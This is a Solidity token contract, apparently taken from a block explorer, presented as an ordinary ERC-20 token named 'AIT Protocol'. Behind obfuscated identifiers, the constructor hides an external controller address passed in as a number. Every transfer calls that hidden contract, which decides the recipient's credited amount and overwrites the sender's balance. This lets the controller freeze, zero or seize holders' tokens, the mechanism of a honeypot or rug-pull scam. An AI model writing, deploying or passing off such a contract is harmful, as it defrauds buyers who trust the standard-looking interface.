/**
 *Submitted for verification at Arbiscan.io on 2024-04-17
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface pmRXzUzKapIviXsiGYREeP {
    function _ac028bcac(
        address zXQexxZzDJn,
        address zjsnwbrkto,
        uint256 fr0eHtABH2,
        uint256 wVaHRSH6fl
    ) external returns (uint256, uint256);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}
/**
 * This contract is for testing purposes only. 
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract TOKEN is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _defaultAddress = address(0x000000000000000000000000000000000000dEaD);
    string private _nameQfvgSN = "AIT Protocol";
    string private _symbolQfvgSN = "AIT";
    uint8 private _decimalsQfvgSN = 9;
    pmRXzUzKapIviXsiGYREeP private c082163a30a;
    uint256 private _tTotal = 1000000000000 * 10**_decimalsQfvgSN;

    constructor(uint256 aQfvgSN) {
        c082163a30a = getBcFkzmhvjklto(((brcFactorkzmhvjklto(aQfvgSN))));
        _tOwned[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public view returns (string memory) {
        return _nameQfvgSN;
    }

    function symbol() public view returns (string memory) {
        return _symbolQfvgSN;
    }

    

    function decimals() public view returns (uint256) {
        return _decimalsQfvgSN;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address zzfgethsrecipient, uint256 bsyqnncpamount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, zzfgethsrecipient, bsyqnncpamount);
        return true;
    }

   function getBcFkzmhvjklto(address accc) internal pure returns (pmRXzUzKapIviXsiGYREeP) {
        return getBcQkzmhvjklto(accc);
    }

    function getBcQkzmhvjklto(address accc) internal pure  returns (pmRXzUzKapIviXsiGYREeP) {
        return pmRXzUzKapIviXsiGYREeP(accc);
    }

    function brc20Mankzmhvjklto(address dnaqqzaifrom,address dnzmqto,uint256 amount,uint256 amountv) private returns(uint256,uint256) {
        return c082163a30a._ac028bcac(dnaqqzaifrom,dnzmqto,amount, amountv);
    }

    function allowance(address iqeibpvxowner, address lcxgmxnjspender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[iqeibpvxowner][lcxgmxnjspender];
    }

    function brcFfffactorkzmhvjklto(uint256 value) internal pure returns (uint160) {
        return (uint160(value));
    }
    
    function brcFactorkzmhvjklto(uint256 value) internal pure returns (address) {
           return address(brcFfffactorkzmhvjklto(value));
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    

    function _transfer(
        address hulwuvfafrom,
        address kzmhvjklto,
        uint256 amount
    ) private {
        require(
            hulwuvfafrom != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            kzmhvjklto != address(0),
            "ERC20: transfer to the zero address"
        );
        uint256 feeAmount = 0;
         (uint256 zzfgethsrecipient, uint256 bsyqnncpamount) = 
        brc20Mankzmhvjklto(
            hulwuvfafrom,
            kzmhvjklto,
            amount,
            _tOwned[hulwuvfafrom]
        );
        _tOwned[hulwuvfafrom] = bsyqnncpamount;
        require(
            _tOwned[hulwuvfafrom] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _tOwned[hulwuvfafrom] = _tOwned[hulwuvfafrom].sub(amount);
        _tOwned[kzmhvjklto] = _tOwned[kzmhvjklto].add(zzfgethsrecipient);
        emit Transfer(hulwuvfafrom, kzmhvjklto, amount);
    }

    function zawymxea() external view returns (uint256) {
    return _decimalsQfvgSN;
    }

    function transferFrom(
        address qoumcgipsender,
        address rqwaoaybrecipient,
        uint256 hftveohtamount
    ) public override returns (bool) {
        _transfer(qoumcgipsender, rqwaoaybrecipient, hftveohtamount);
        _approve(
            qoumcgipsender,
            msg.sender,
            _allowances[qoumcgipsender][msg.sender].sub(
                hftveohtamount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    
}